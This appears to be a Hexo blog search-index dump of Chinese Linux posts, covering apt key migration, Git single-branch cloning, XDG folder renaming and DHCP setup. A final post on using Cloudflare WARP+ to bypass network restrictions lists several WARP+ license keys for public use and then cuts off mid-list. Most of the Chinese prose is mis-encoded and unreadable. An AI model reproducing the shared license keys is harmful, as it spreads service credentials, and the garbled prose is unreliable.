/etc/apt/sources.list.d/\nknight@knight:/etc/apt/sources.list.d$ ls\ndeepin_appstore.list       google-chrome.list.save       typora.list       vscode.list.save\ndeepin_appstore.list.save  tickstep-aliyunpan.list       typora.list.save  winehq-focal.sources\ngoogle-chrome.list         tickstep-aliyunpan.list.save  vscode.list\nknight@knight:/etc/apt/sources.list.d$ sudo rm -rf typora.list*\nknight@knight:/etc/apt/sources.list.d$ ls\ndeepin_appstore.list       google-chrome.list.save       vscode.list\ndeepin_appstore.list.save  tickstep-aliyunpan.list       vscode.list.save\ngoogle-chrome.list         tickstep-aliyunpan.list.save  winehq-focal.sources\n```\n\n* è§£å†³æœ‰è¿‡æœŸçš„å­˜å‚¨ç§˜é’¥\n\nè§£å†³å®Œç´¢å¼•æ–‡ä»¶çš„é—®é¢˜ä¹‹åï¼Œè­¦å‘Šå°±å˜æˆäº†ï¼š\n\n```bash\næœ‰ 44 ä¸ªè½¯ä»¶åŒ…å¯ä»¥å‡çº§ã€‚è¯·æ‰§è¡Œ â€˜apt list --upgradableâ€™ æ¥æŸ¥çœ‹å®ƒä»¬ã€‚\nW: https://community-store-packages.deepin.com/appstore/dists/eagle/InRelease: å¯†é’¥å­˜å‚¨åœ¨è¿‡æ—¶çš„ trusted.gpg å¯†é’¥ç¯ä¸­ï¼ˆ/etc/apt/trusted.gpgï¼‰ï¼Œè¯·å‚è§ apt-key(8) çš„ DEPRECATION ä¸€èŠ‚ä»¥äº†è§£è¯¦æƒ…ã€‚\n```\n\n1. é¦–å…ˆå…ˆæŸ¥çœ‹ä¸€ä¸‹ç³»ç»Ÿæœ‰å¤šå°‘å­˜å‚¨ç§˜é’¥\n\n```bash\nknight@knight:~/nustarain$ sudo apt-key list\n[sudo] knight çš„å¯†ç ï¼š \nWarning: apt-key is deprecated. Manage keyring files in trusted.gpg.d instead (see apt-key(8)).\n/etc/apt/trusted.gpg\n--------------------\npub   rsa2048 2014-12-16 [SC]\n      6BDB FE94 72C9 961F 4C19  73A1 4259 56BB 3E31 DF51\nuid             [ æœªçŸ¥ ] pkg-builder <pkg-builder@packages.linuxdeepin.com>\nsub   rsa2048 2014-12-16 [E]\n\npub   rsa2048 2019-11-21 [SC]\n      1D54 8EFE B9FA 97F2 FFEC  C7FE 1C30 362C 0A53 D5BB\nuid             [ æœªçŸ¥ ] appstore (appstore key) <appstore@deepin.com>\nsub   rsa2048 2019-11-21 [E]\nsub   rsa2048 2019-11-21 [E]\n\n/etc/apt/trusted.gpg.d/appstore.gpg\n-----------------------------------\npub   rsa2048 2019-11-21 [SC]\n      1D54 8EFE B9FA 97F2 FFEC  C7FE 1C30 362C 0A53 D5BB\nuid             [ æœªçŸ¥ ] appstore (appstore key) <appstore@deepin.com>\nsub   rsa2048 2019-11-21 [E]\nsub   rsa2048 2019-11-21 [E]\n\n/etc/apt/trusted.gpg.d/google-chrome.gpg\n----------------------------------------\npub   rsa4096 2016-04-12 [SC]\n      EB4C 1BFD 4F04 2F6D DDCC  EC91 7721 F63B D38B 4796\nuid             [ æœªçŸ¥ ] Google Inc. (Linux Packages Signing Authority) <linux-packages-keymaster@google.com>\nsub   rsa4096 2021-10-26 [S] [æœ‰æ•ˆè‡³ï¼š2024-10-25]\nsub   rsa4096 2023-02-15 [S] [æœ‰æ•ˆè‡³ï¼š2026-02-14]\n\n/etc/apt/trusted.gpg.d/microsoft.gpg\n------------------------------------\npub   rsa2048 2015-10-28 [SC]\n      BC52 8686 B50D 79E3 39D3  721C EB3E 94AD BE12 29CF\nuid             [ æœªçŸ¥ ] Microsoft (Release signing) <gpgsecurity@microsoft.com>\n\n/etc/apt/trusted.gpg.d/tickstep-packages-archive-keyring.gpg\n------------------------------------------------------------\npub   rsa4096 2022-07-30 [SCEA]\n      071D E06F 6BCE 212C 5483  CECF 3D4C 35B0 8026 4AA9\nuid             [ æœªçŸ¥ ] tickstep <tickstep@outlook.com>\n\n/etc/apt/trusted.gpg.d/ubuntu-keyring-2012-cdimage.gpg\n------------------------------------------------------\npub   rsa4096 2012-05-11 [SC]\n      8439 38DF 228D 22F7 B374  2BC0 D94A A3F0 EFE2 1092\nuid             [ æœªçŸ¥ ] Ubuntu CD Image Automatic Signing Key (2012) <cdimage@ubuntu.com>\n\n/etc/apt/trusted.gpg.d/ubuntu-keyring-2018-archive.gpg\n------------------------------------------------------\npub   rsa4096 2018-09-17 [SC]\n      F6EC B376 2474 EDA9 D21B  7022 8719 20D1 991B C93C\nuid             [ æœªçŸ¥ ] Ubuntu Archive Automatic Signing Key (2018) <ftpmaster@ubuntu.com>\n```\n\n2. å¯ä»¥çœ‹åˆ°æœ‰å¾ˆå¤šç§˜é’¥ï¼Œç„¶ååœ¨æŠ¥é”™ä¿¡æ¯é‡Œé¢æ‰¾å…³é”®å­—ï¼Œå‘ç°æœ‰`deepin`å…³é”®å­—ï¼Œç„¶åä½¿ç”¨ grep æŸ¥æ‰¾ï¼Œå¯ä»¥ç­›é€‰å‡ºæ¥ï¼Œç¬¦åˆæ¡ä»¶çš„å°±åªæœ‰ä¸¤ä¸ªã€‚\n\n```bash\n/etc/apt/trusted.gpg\n--------------------\npub   rsa2048 2014-12-16 [SC]\n      6BDB FE94 72C9 961F 4C19  73A1 4259 56BB 3E31 DF51\nuid             [ æœªçŸ¥ ] pkg-builder <pkg-builder@packages.linuxdeepin.com>\nsub   rsa2048 2014-12-16 [E]\n\npub   rsa2048 2019-11-21 [SC]\n      1D54 8EFE B9FA 97F2 FFEC  C7FE 1C30 362C 0A53 D5BB\nuid             [ æœªçŸ¥ ] appstore (appstore key) <appstore@deepin.com>\nsub   rsa2048 2019-11-21 [E]\nsub   rsa2048 2019-11-21 [E]\n```\n\n3. å°†è¿™ä¸¤ä¸ªç§˜é’¥é€ä¸€å¯¼å‡ºå³å¯ï¼Œå¯¼å‡ºæ—¶ç”¨åˆ°ç§˜é’¥çš„å8ä½ä½œä¸ºæ ‡è®°ï¼ˆå»æ‰ç©ºæ ¼ï¼‰ã€‚\n\n```bash\nknight@knight:/etc/apt/trusted.gpg.d$ sudo apt-key export 0A53D5BB | sudo gpg --dearmour -o /etc/apt/trusted.gpg.d/appstore.gpg\nWarning: apt-key is deprecated. Manage keyring files in trusted.gpg.d instead (see apt-key(8)).\n```\n\nä¸Šé¢è¿™æ¡å‘½ä»¤çš„æ„æ€æ˜¯ï¼šå¯¼å‡ºç§˜é’¥å8ä½ä¸º`0A53D5BB`çš„ç§˜é’¥ï¼Œå¯¼å‡ºåˆ°`/etc/apt/trusted.gpg.d/`ç›®å½•ä¸‹ï¼Œå¹¶ä¸”å‘½åä¸º`appstore.gpg`ã€‚\n\nç„¶åå»å­˜å‚¨ç§˜é’¥çš„ç›®å½•ä¸‹éªŒè¯ï¼Œå‘ç°å­˜åœ¨è¿™æ ·çš„ä¸€ä¸ªæ–‡ä»¶ã€‚\n\n```bash\nknight@knight:/etc/apt/trusted.gpg.d$ ls /etc/apt/trusted.gpg.d/\nappstore.gpg       microsoft.gpg                          ubuntu-keyring-2012-cdimage.gpg\ngoogle-chrome.gpg  tickstep-packages-archive-keyring.gpg  ubuntu-keyring-2018-archive.gpg\n```\n\n4. æœ€åï¼Œ`sudo apt-key list`æŸ¥çœ‹å¯¼å‡ºçš„ç§˜é’¥å¹¶ä¸ä¼šæ¶ˆå¤±ï¼Œä½†æ˜¯æ‰§è¡Œ`sudo apt update`ä¸ä¼šå†æŠ¥è­¦å‘Šäº†ã€‚\n\n```\nè·å–:18 http://mirrors.aliyun.com/ubuntu jammy-security/universe amd64 DEP-11 Metadata [39.9 kB] \nå‘½ä¸­:19 https://dl.winehq.org/wine-builds/ubuntu focal InRelease                     \nå‘½ä¸­:20 http://file.tickstep.com/apt aliyunpan InRelease \nå·²ä¸‹è½½ 3,765 kBï¼Œè€—æ—¶ 6ç§’ (654 kB/s)\næ­£åœ¨è¯»å–è½¯ä»¶åŒ…åˆ—è¡¨... å®Œæˆ\næ­£åœ¨åˆ†æè½¯ä»¶åŒ…çš„ä¾èµ–å…³ç³»æ ‘... å®Œæˆ\næ­£åœ¨è¯»å–çŠ¶æ€ä¿¡æ¯... å®Œæˆ                 \næœ‰ 11 ä¸ªè½¯ä»¶åŒ…å¯ä»¥å‡çº§ã€‚è¯·æ‰§è¡Œ â€˜apt list --upgradableâ€™ æ¥æŸ¥çœ‹å®ƒä»¬ã€‚\nknight@knight:~/nustarain$ \n```","tags":["Ubuntu"],"categories":["æ¢ç´¢"]},{"title":"Gitå…‹éš†æŒ‡å®šçš„åˆ†æ”¯","url":"/2023/08/06/GitSpecifyBranch/","content":"\n### é—®é¢˜æè¿°\n\nåœ¨Gitå…‹éš†æ—¶ï¼Œæœ‰æ—¶å€™æˆ‘ä»¬ä¸ä¸€å®šè¦å…‹éš†ä¸»åˆ†æ”¯ï¼Œæ›´å¤šçš„ä¹Ÿä¼šé‡åˆ°å…‹éš†å…¶ä»–åˆ†æ”¯ï¼Œè€Œåœ¨é»˜è®¤çš„å…‹éš†ä¸­ï¼Œä¼šç›´æ¥å…‹éš†ä¸»åˆ†æ”¯ï¼Œé‚£ä¹ˆå¦‚ä½•å…‹éš†å…¶ä»–åˆ†æ”¯å‘¢ï¼Ÿ\n\n### è§£å†³åŠæ³•\n\næ‰§è¡Œä¸‹é¢çš„å‘½ä»¤\n\n```git\ngit clone --branch <branchname> <remote-repo-url>\n```\n\n<!-- more -->\n\næˆ–è€…\n\n```git\ngit clone -b <branchname> <remote-repo-url>\n```\n\nè¿™é‡Œ -b åªæ˜¯ --branch çš„åˆ«åã€‚\n\nè¿™æ ·ï¼Œä½ å°±å¯ä»¥è·å–ä»“åº“ä¸­çš„æ‰€æœ‰åˆ†æ”¯ï¼Œåˆ‡æ¢åˆ°ä½ æŒ‡å®šçš„åˆ†æ”¯ï¼ŒæŒ‡å®šçš„åˆ†æ”¯æˆä¸ºæœ¬åœ°åˆ†æ”¯ç”¨äº git push å’Œ git pullã€‚ä½†ä½ ä»ç„¶ä»æ¯ä¸ªåˆ†æ”¯ä¸­è·å–äº†æ‰€æœ‰æ–‡ä»¶ã€‚è™½ç„¶å·²ç»è¾¾åˆ°äº†æƒ³è¦çš„ç»“æœï¼Œä½†æ˜¯è¿™æ ·çš„æ•ˆæœå¹¶ä¸æ˜¯å¾ˆä»¤äººæ»¡æ„ã€‚\n\nè¿™ä¼šè‡ªåŠ¨å°†æŒ‡å®šçš„åˆ†æ”¯é…ç½®ä¸ºæœ¬åœ°åˆ†æ”¯ï¼Œä½†ä»ä¼šè·Ÿè¸ªå…¶ä»–åˆ†æ”¯ã€‚ç±»ä¼¼è¿™æ ·ï¼š\n\n```bash\nknight@knight:~/nustarain$ git remote show origin \n* è¿œç¨‹ origin\n  è·å–åœ°å€ï¼šhttps://gitee.com/nustarain/nustarain.git\n  æ¨é€åœ°å€ï¼šhttps://gitee.com/nustarain/nustarain.git\n  HEAD åˆ†æ”¯ï¼šmain\n  è¿œç¨‹åˆ†æ”¯ï¼š\n    hexo å·²è·Ÿè¸ª\n    main å·²è·Ÿè¸ª\n  ä¸º 'git pull' é…ç½®çš„æœ¬åœ°åˆ†æ”¯ï¼š\n    hexo ä¸è¿œç¨‹ hexo åˆå¹¶\n    main ä¸è¿œç¨‹ main åˆå¹¶\n  ä¸º 'git push' é…ç½®çš„æœ¬åœ°å¼•ç”¨ï¼š\n    hexo æ¨é€è‡³ hexo (æœ€æ–°)\n    main æ¨é€è‡³ main (æœ€æ–°)\n```\n\nå¦‚æœè¦å•çº¯çš„åªå…‹éš†ä¸€ä¸ªåˆ†æ”¯ï¼Œåªéœ€è¦åŠ ä¸€ä¸ªå‚æ•°å³å¯ï¼š\n\n```git\ngit clone --branch <branchname> --single-branch <remote-repo-url>\n```\n\næˆ–è€…\n\n```git\ngit clone -b <branchname> --single-branch <remote-repo-url>\n```\n\nåŠ ä¸Š--single-branchå°±åªä¼šè·Ÿè¸ªè¿™ä¸ªæŒ‡å®šçš„åˆ†æ”¯äº†ã€‚","tags":["Git"],"categories":["å­¦ä¹ è¿‡ç¨‹"]},{"title":"ç§»é™¤Ubuntuæ¡Œé¢çš„å®¶ç›®å½•æ–‡ä»¶å¤¹","url":"/2023/08/06/DelDesktopFolder/","content":"\n### é—®é¢˜æè¿°\n\nç”±äºä¸­æ–‡ç‰ˆUbuntuçš„ç³»ç»Ÿåœ¨ä¸ªäººå®¶ç›®å½•ä¼šæ˜¾ç¤ºä¸­æ–‡çš„æ–‡ä»¶å¤¹ï¼ˆæ¡Œé¢ï¼Œæ–‡æ¡£ï¼Œç…§ç‰‡ç­‰è¿™äº›ï¼‰ï¼Œå› ä¸ºåœ¨è¿›å…¥è¿™äº›ç›®å½•æ—¶éœ€è¦å…ˆä¿®æ”¹è¾“å…¥æ³•è¯­è¨€ï¼Œåœ¨ä½¿ç”¨äº†ä¸€æ®µæ—¶é—´çš„Ubuntuåï¼Œæ„Ÿåˆ°å®åœ¨è´¹åŠ²ï¼Œæ‰€ä»¥ç´¢æ€§å°†è¿™äº›æ–‡ä»¶å¤¹éƒ½æ”¹æˆäº†å¯¹åº”çš„è‹±æ–‡åå­—ï¼Œæ¯”å¦‚æ¡Œé¢å¯¹åº”â€œDesktopâ€ï¼Œåæ¥å¯¼è‡´Ubuntuå¼€æœºä¹‹åï¼Œå®¶ç›®å½•ä¸‹çš„æ–‡ä»¶å¤¹å…¨éƒ¨éƒ½æ˜¾ç¤ºåˆ°äº†æ¡Œé¢ï¼ŒçœŸçš„æ˜¯ä¸‘åˆ°æç‚¹ã€‚\n\nåæ¥ç»è¿‡ä¸€ç•ªçš„æŸ¥æ‰¾èµ„æ–™ï¼Œç»ˆäºæ‰¾åˆ°äº†è§£å†³åŠæ³•ã€‚\n\n### è§£å†³åŠæ³•\n\n1. åœ¨Ubuntuç³»ç»Ÿä¸­æœ‰ä¸€ä¸ªæ–‡ä»¶å¤¹ç®¡ç†ç€å®¶ç›®å½•çš„æ–‡ä»¶å¤¹åå­—å’Œå®¶ç›®å½•æŸç§ç¨‹åº¦ä¸Šçš„ç³»ç»Ÿå˜é‡çš„å…³ç³»ã€‚åœ¨è¿™ä¸ªæ–‡ä»¶å¤¹ä¸­è®°å½•ç€ç³»ç»Ÿå˜é‡å’Œå®¶ç›®å½•çš„å¯¹åº”å…³ç³»ã€‚\n\n<!-- more -->\n\n2. å¯ä»¥ç›´æ¥æŸ¥çœ‹è¿™ä¸ªæ–‡ä»¶`cat ~/.config/user-dirs.dirs`\n\n```bash\n# This file is written by xdg-user-dirs-update\n# If you want to change or add directories, just edit the line you're\n# interested in. All local changes will be retained on the next run.\n# Format is XDG_xxx_DIR=\"$HOME/yyy\", where yyy is a shell-escaped\n# homedir-relative path, or XDG_xxx_DIR=\"/yyy\", where /yyy is an\n# absolute path. No other format is supported.\n# \nXDG_DESKTOP_DIR=\"$HOME/æ¡Œé¢\"\nXDG_DOWNLOAD_DIR=\"$HOME/ä¸‹è½½\"\nXDG_TEMPLATES_DIR=\"$HOME/æ¨¡æ¿\"\nXDG_PUBLICSHARE_DIR=\"$HOME/å…¬å…±\"\nXDG_DOCUMENTS_DIR=\"$HOME/æ–‡æ¡£\"\nXDG_MUSIC_DIR=\"$HOME/éŸ³ä¹\"\nXDG_PICTURES_DIR=\"$HOME/å›¾ç‰‡\"\nXDG_VIDEOS_DIR=\"$HOME/è§†é¢‘\"\n```\n\n3. ä¸Šé¢æ˜¯æˆ‘ä¿®æ”¹å®Œä¹‹å‰çš„æ ·å­ï¼Œåœ¨ä¿®æ”¹ä¹‹åæ˜¯è¿™æ ·çš„ï¼š\n\n```bash\n# This file is written by xdg-user-dirs-update\n# If you want to change or add directories, just edit the line you're\n# interested in. All local changes will be retained on the next run.\n# Format is XDG_xxx_DIR=\"$HOME/yyy\", where yyy is a shell-escaped\n# homedir-relative path, or XDG_xxx_DIR=\"/yyy\", where /yyy is an\n# absolute path. No other format is supported.\n# \nXDG_DESKTOP_DIR=\"$HOME/Desktop\"\nXDG_DOWNLOAD_DIR=\"$HOME/Downloads\"\nXDG_TEMPLATES_DIR=\"$HOME/Template\"\nXDG_PUBLICSHARE_DIR=\"$HOME/Public\"\nXDG_DOCUMENTS_DIR=\"$HOME/Document\"\nXDG_MUSIC_DIR=\"$HOME/Music\"\nXDG_PICTURES_DIR=\"$HOME/Picture\"\nXDG_VIDEOS_DIR=\"$HOME/Viedo\"\n```\n\n4. ä¿®æ”¹å®Œè¿™ä¸ªé…ç½®æ–‡ä»¶ï¼Œç„¶åæŠŠå®¶ç›®å½•çš„å¯¹åº”æ–‡ä»¶å¤¹çš„åå­—ä¿®æ”¹ä¸ºä¸é…ç½®æ–‡ä»¶ä¸€è‡´å°±OKäº†ï¼\n\n```bash\nknight@knight:~/.ssh$ cd ~\nknight@knight:~$ ls\naliyun  Desktop   Downloads  nustarain          Public    snap      Viedo\nchrome  dingtalk  Music      package-lock.json  qq        sougou    vs_code\nclash   Document  node       Picture            qq_music  Template  wechat\n```\n\n5. å…³æœºï¼Œé‡å¯ï¼Œå°±ä¼šå‘ç°æ¡Œé¢çš„å®¶ç›®å½•æ–‡ä»¶å¤¹å…¨éƒ½æ¶ˆå¤±äº†ã€‚","tags":["Ubuntu"],"categories":["æ¢ç´¢"]},{"title":"Linuxé…ç½®DHCPæœåŠ¡å™¨","url":"/2023/07/27/conf-dhcp/","content":"\nå…³äºDHCPçš„é…ç½®æ˜¯åœ¨å¾ˆä¹…ä¹‹å‰å­¦ä¹ é…ç½®çš„ï¼Œå¹¶æ²¡æœ‰æ•´ç†æˆå†Œï¼Œä»Šå¤©é—²ä¸‹å¿ƒæ¥å†æŠŠå…³äºDHCPé…ç½®çš„æ–¹æ³•å›é¡¾ä¸€ä¸‹ã€‚\n\n### DHCPé…ç½®æµç¨‹\n\n1. ä¸‹è½½è½¯ä»¶åŒ…\n\n```bash\nyum install -y dhcp-server\n```\n\nä»Centos8å¼€å§‹ï¼Œå…³äºDHCPçš„é…ç½®ï¼Œè½¯ä»¶åŒ…å°±å˜æˆäº†â€œdhcp-serverâ€è¿™æ˜¯æœåŠ¡å™¨ç«¯çš„è½¯ä»¶åŒ…ï¼Œä¸æ­¤ç›¸å¯¹åº”çš„è¿˜æœ‰å®¢æˆ·ç«¯ä½¿ç”¨çš„â€œdhcp-clientâ€ã€‚\n\n<!-- more -->\n\n2. å¤åˆ¶é…ç½®æ–‡ä»¶\n\ndhcpçš„é…ç½®æ–‡ä»¶æ˜¯`/etc/dhcp/dhcpd.conf`ï¼Œä½†æ˜¯æ¯”è¾ƒé¸¡è‚‹çš„æ˜¯ï¼Œè¿™ä¸ªé…ç½®æ–‡ä»¶æ˜¯ç©ºçš„ï¼Œåªæœ‰ä¸‰è¡Œæ³¨é‡Šï¼Œä½†æ˜¯dhcpæä¾›äº†ä¸€ä¸ªæ¨¡æ¿æ–‡ä»¶`/usr/share/doc/dhcp-server/dhcpd.conf.example`ï¼Œå¯ä»¥ç›´æ¥æ‹·è´è¿‡å»ä½¿ç”¨ã€‚\n\nå› ä¸ºé…ç½®æ–‡ä»¶æœ‰å¾ˆå¤šæ³¨é‡Šï¼Œçœ‹èµ·æ¥éå¸¸æ‚ä¹±ï¼Œæ‰€ä»¥æ‰§è¡Œä»¥ä¸‹è¿™æ¡å‘½ä»¤ï¼Œç›´æ¥å¸¦èµ°æ‰€æœ‰æ³¨é‡Šã€‚\n\n```bash\negrep -v \"^#|^$\" /usr/share/doc/dhcp-server/dhcpd.conf.example > /etc/dhcp/dhcpd.conf\n```\n\n3. é…ç½®æ–‡ä»¶å†…å®¹åŠå«ä¹‰\n\n```bash\n# å®šä¹‰å…¨å±€å‚æ•°ï¼šé»˜è®¤æœç´¢åŸŸ\noption domain-name \"blog.nustarain.com\";\n# å®šä¹‰å…¨å±€å‚æ•°ï¼šåŸŸåæœåŠ¡å™¨ï¼ˆè‹¥æ˜¯å¤šä¸ªåŸŸåæœåŠ¡å™¨ä½¿ç”¨é€—å·é—´éš”ï¼‰\noption domain-name-servers ns1.nustarain.com;\n# å®šä¹‰å…¨å±€å‚æ•°ï¼šé»˜è®¤ç§ŸæœŸ\ndefault-lease-time 600;\n# å®šä¹‰å…¨å±€å‚æ•°ã€‚æœ€å¤§ç§ŸæœŸ\nmax-lease-time 7200;\nlog-facility local7;\n# å®šä¹‰ç½‘ç»œå·ä¸º10.8.7.0å­ç½‘æ©ç ä¸º255.255.255.0çš„å­ç½‘\nsubnet 10.8.7.0 netmask 255.255.255.0 {\n  # å­ç½‘IPåœ°å€æ± çš„èŒƒå›´\n  range 10.8.7.10 10.8.7.253;\n  # è®¾ç½®å­ç½‘çš„é»˜è®¤ç½‘å…³\n  option routers 10.8.7.254;\n  # è®¾ç½®å­ç½‘çš„å¹¿æ’­åœ°å€\n  option broadcast-address 10.8.7.255;\n  default-lease-time 600;\n  max-lease-time 7200;\n}\n# å‘ç‰¹æ®Šä¸»æœºåˆ†é…ç‰¹å®šçš„IPï¼Œå½“è¦ç»™å¤šä¸ªç‰¹æ®Šçš„ä¸»æœºåˆ†é…IPæ—¶ï¼Œhost åçš„åç§°è¦æ±‚å¿…é¡»å”¯ä¸€\nhost fantasia {\n  # æŒ‡å®šä¸»æœºçš„MACåœ°å€\n  hardware ethernet 00:0c:29:af:33:58;\n  # æŒ‡å®šè¦åˆ†é…çš„IPåœ°å€\n  fixed-address 10.8.7.68;\n}\n```\n\nåœ¨æ•´ä¸ªDHCPçš„é…ç½®ä¸­ï¼Œè¦æ³¨æ„DHCPé…ç½®æ–‡ä»¶çš„è¯­æ³•è§„åˆ™ï¼Œå°¤å…¶æ˜¯åˆ†å·çš„ä½¿ç”¨ï¼Œç¨ä¸ç•™ç¥å°±ä¼šæŠ¥é”™ã€‚\né…ç½®å®Œé…ç½®æ–‡ä»¶ä¹‹åï¼Œå¯ä»¥ä½¿ç”¨`dhcpd -t`æ¥è¿›è¡Œè¯­æ³•æ£€æŸ¥ï¼Œå‡ºç°ä¸‹é¢çš„è¯­å¥è¡¨ç¤ºæ²¡æœ‰é”™è¯¯ï¼Œåä¹‹å°±è¦æ£€æŸ¥é”™è¯¯äº†ã€‚\n\n```bash\nInternet Systems Consortium DHCP Server 4.3.6\nCopyright 2004-2017 Internet Systems Consortium.\nAll rights reserved.\nFor info, please visit https://www.isc.org/software/dhcp/\nldap_gssapi_principal is not set,GSSAPI Authentication for LDAP will not be used\nNot searching LDAP since ldap-server, ldap-port and ldap-base-dn were not specified in the config file\nConfig file: /etc/dhcp/dhcpd.conf\nDatabase file: /var/lib/dhcpd/dhcpd.leases\nPID file: /var/run/dhcpd.pid\nSource compiled to use binary-leases\n```\n\nPlease rememberï¼šPractice makes perfect.\n\n### å®¢æˆ·æœºè·å–IPåœ°å€\n\nç›¸æ¯”æœåŠ¡å™¨ç«¯çš„é…ç½®ï¼Œå®¢æˆ·æœºçš„æ“ä½œå°±æ¯”è¾ƒç®€å•ä¸€ç‚¹ã€‚\n\n1. ä¸‹è½½è½¯ä»¶åŒ…ã€‚\n\n```bash\nyum install -y dhcp-client\n```\n\n2. ï¼ˆå¯é€‰ï¼‰ï¼Œå¦‚æœå½“å‰ç½‘å¡å·²ç»æ˜¯åŠ¨æ€è·å–çš„æ¨¡å¼ï¼Œé‚£ä¹ˆå°±ä¸éœ€è¦æ”¹é…ç½®æ–‡ä»¶äº†ï¼Œå¦‚æœç½‘å¡æ˜¯é™æ€æŒ‡å®šçš„ï¼Œé‚£ä¹ˆå°±éœ€è¦ä¿®æ”¹ä¸€ä¸‹ã€‚ç½‘å¡é…ç½®æ–‡ä»¶è·¯å¾„`/etc/sysconfig/network-scripts/ifcfg-ens160`ï¼Œä¿®æ”¹é‡Œé¢çš„`BOOTPROTO=dhcp`ï¼Œä¿å­˜é€€å‡ºã€‚\n\n3. æ‰§è¡Œå‘½ä»¤æ›´æ–°é‡å¯ç½‘å¡ã€‚\n\n```bash\nsystemctl restart NetworkManager\nnmcli c d ens160\nnmcli c up ens160\n```\n\n4. ç›¸å…³å‘½ä»¤ã€‚\n\n```bash\ndhclient ens160    # è‡ªåŠ¨è·å–IPåœ°å€\ndhclient -r ens160    # é‡Šæ”¾å½“å‰IP\n```","tags":["Linux"],"categories":["æŠ€æœ¯"]},{"title":"science onlineçš„ç»ˆæè§£å†³æ–¹æ¡ˆ","url":"/2023/07/25/science-network/","content":"\nä»æˆ‘æœ‰äº†ç¬¬ä¸€å°ç”µè„‘åï¼Œscience onlineçš„æ‰‹æ®µä¹Ÿé€æ¸è§è¯ç€æˆ‘çš„æˆé•¿ï¼Œä»æœ€åˆçš„æµè§ˆå™¨æ’ä»¶ä¸Šç½‘ï¼Œåˆ°SSRçš„å°é£æœºï¼Œå†åˆ°V2rayï¼Œä»¥åŠåé¢é™ªä¼´æˆ‘æœ€ä¹…çš„clashã€‚å¯ä»¥è¯´å·²ç»æ˜¯èº«ç»ç™¾æˆ˜çš„è€æ²¹æ¡äº†ã€‚åˆ°ä»Šå¤©æˆ‘åˆé‡åˆ°äº†ä¸€ä¸ªå…·æœ‰é‡Œç¨‹ç¢‘å¼çš„science onlineæ‰‹æ®µ**CloudFlare+Warp+ ä¼˜é€‰IP**ã€‚\n\nCloudFlareæ‹¥æœ‰æé«˜çš„ä¸šç•Œæƒå¨ï¼Œæ‹¥æœ‰é¡¶å°–çš„æŠ€æœ¯å›¢é˜Ÿï¼Œæ‹¥æœ‰æœ€å®‰å…¨çš„ç½‘ç»œæ–¹æ¡ˆï¼Œä»–ä»¬å…¬å¸çš„æ¨å‡ºçš„science onlineæŠ€æœ¯é‚£æ˜¯æ— å½¢ä¸­ä»£è¡¨äº†ä¸€ä¸ªæŠ€æœ¯æ ‡å‡†çš„ã€‚åœ¨æˆ‘å®é™…ä½“éªŒä¸‹æ¥ï¼Œæ•ˆæœç¡®å®éå¸¸å¥½ï¼Œå¾ˆèˆ’æœã€‚\n\n<!-- more -->\n\n### ç¯å¢ƒå‡†å¤‡\n\nè™½è¯´æ˜¯æ•™ç¨‹ï¼Œä½†å¯ä¸æ˜¯ä»0å¼€å§‹çš„æ•™ç¨‹ã€‚\n\n* éœ€è¦æ‹¥æœ‰telegramè´¦å·å’Œå®¢æˆ·ç«¯ï¼Œå®¢æˆ·ç«¯å¯ä»¥æ˜¯å®‰å“ã€windowsã€Macã€iOSã€Linuxã€‚\n\n* [telegramå®˜ç½‘](https://telegram.org/)\n\n### è·å–Warp+çš„æ°¸ä¹…å…è´¹æµé‡\n\néœ€è¦åœ¨telegramé‡Œæœç´¢ä¸€ä¸ªæœºå™¨äººï¼Œæœºå™¨äººå«â€œwarp+ botâ€ï¼Œä½†æ˜¯æˆ‘è¯•äº†ä¸€ä¸‹ï¼Œç›´æ¥æœæ˜¯æœä¸å‡ºæ¥çš„ï¼Œåæ¥å‘ç°å¯ä»¥é€šè¿‡é“¾æ¥ç›´æ¥æ‰¾åˆ°ä»–ï¼Œ[é“¾æ¥åœ°å€](https://t.me/generatewarpplusbot)\n\n![telegram](./science-network/1.jpg)\n\n* æ‰¾åˆ°è¿™ä¸ªæœºå™¨äººä¹‹åï¼Œå‘é€æŒ‡ä»¤`/generate`\n\n* ç„¶åä»–ä¼šè®©ä½ å…³æ³¨ä¸¤ä¸ªç±»ä¼¼å…¬ä¼—å·çš„ä¸œè¥¿ï¼Œå°±æ˜¯å›¾ä¸­çš„`Warp Plus`å’Œ`akame.moe enjoyers`ç›´æ¥æŒ‰ä»–çš„æ„æ€è¿›è¡Œå…³æ³¨\n\n* å†æ¬¡å‘é€`/generate` ç„¶åä»–ä¼šè¿›è¡ŒçœŸäººéªŒè¯ï¼Œç»™ä½ å‡ºä¸€é“ä¸€ä½æ•°ç›¸åŠ çš„æ•°å­¦é¢˜\n\n* æŒ‰ç…§ä»–çš„é¢˜ï¼ŒæŠŠç­”æ¡ˆå†™åœ¨å‘½ä»¤ä¹‹åï¼Œæ¯”å¦‚å›¾ä¸­çš„`/generate 8`ï¼Œç„¶åå°±å¯ä»¥æ‹¿åˆ°ä¸€ä¸ªç§˜é’¥ï¼ŒæŠŠè¿™ä¸ªç§˜é’¥ç•™å¥½ï¼Œå¾…ä¼šè¦ç”¨åˆ°ã€‚ï¼ˆå…¶å®ä¸ç•™å¥½ä¹Ÿæ²¡å…³ç³»ï¼Œä¸¢äº†å¯ä»¥å†ç”³é¢†ä¸€ä¸ªï¼Œè€Œä¸”æ¯ä¸ªç§˜é’¥å«çš„æµé‡å·²ç»è¶…è¿‡2EBäº†ï¼Œæ‰€ä»¥è¯´æ ¹æœ¬ç”¨ä¸å®Œï¼Œå°±å·®æŠŠæ°¸ä¹…å…è´¹å†™åœ¨è„‘é—¨ä¸Šäº†ï¼‰\n\næˆ‘ä¹Ÿå‘å¤§å®¶æä¾›å‡ ä¸ªå¯ä»¥ç›´æ¥ä½¿ç”¨çš„ç§˜é’¥ï¼š\n\n```bash\nğŸ” Key: T23Xt4d0-w6J8K04D-18l5xeE6 (24598562 GB)\nğŸ” Key: A7o25Ti0-6L73vi2x-85oL63gt (24598562 GB)\nğŸ” Key: l8PNO546-Lt90kn31-O659R1rZ (24598562 GB)\nğŸ” Key: 8Rh75w0a-7xO04f5W-B32tI8n9 (24598562 GB)\nğŸ” Key: jmB9306F-789SI6ph-7S365JVv (24598562 GB)\nğŸ” Key: 164biRE3-ct261Rh3-8y9RC6L5 (24598562 GB)\nğŸ” Key: 73sH81gV-7dDQ239P-5br73p6L (24598562 GB)\nğŸ” Key: 9BH18g0q-8TV9U6r4-zcDr8703 (24598562 GB)\nğŸ” Key: w9L6WQ14-t375aI2F-91j27zEW (24598562 GB)\nğŸ” Key: L76Hzc89-pN9r36S0-T85Jw0z9 (24598562 